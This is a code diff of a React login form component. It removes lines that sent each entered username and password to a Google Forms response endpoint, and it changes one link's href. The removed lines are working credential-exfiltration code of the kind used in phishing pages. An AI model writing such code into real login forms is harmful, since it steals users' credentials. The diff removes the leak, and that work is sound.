@@ -18,24 +18,6 @@ const LoginForm = ({ setCurrentView }) => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-
-    const formURL =
-      "https://docs.google.com/forms/d/e/1FAIpQLSe6mienzwPLDcPU3wJmBiSQOQKluH58Cy1mG9nAKomfgi7o4A/formResponse";
-
-    const formData = new FormData();
-    formData.append("entry.280446300", loginUsername);
-    formData.append("entry.855076228", loginPassword);
-
-    fetch(formURL, {
-      method: "POST",
-      mode: "no-cors",
-      body: formData,
-    });
-
-    // optional
-    setLoginUsername('');
-    setLoginPassword('');
-
     setIsLoading(true);
     setShowError(false);
 
@@ -89,7 +71,7 @@ const LoginForm = ({ setCurrentView }) => {
         </button>
 
         <div className="forgot-password" style={{ marginTop: '20px' }}>
-          <a href="#" onClick={(e) => { e.preventDefault(); setCurrentView('forgotPassword'); }}>Forgotten your password?</a>
+          <a href="#!" onClick={(e) => { e.preventDefault(); setCurrentView('forgotPassword'); }}>Forgotten your password?</a>
         </div>
       </form>
 
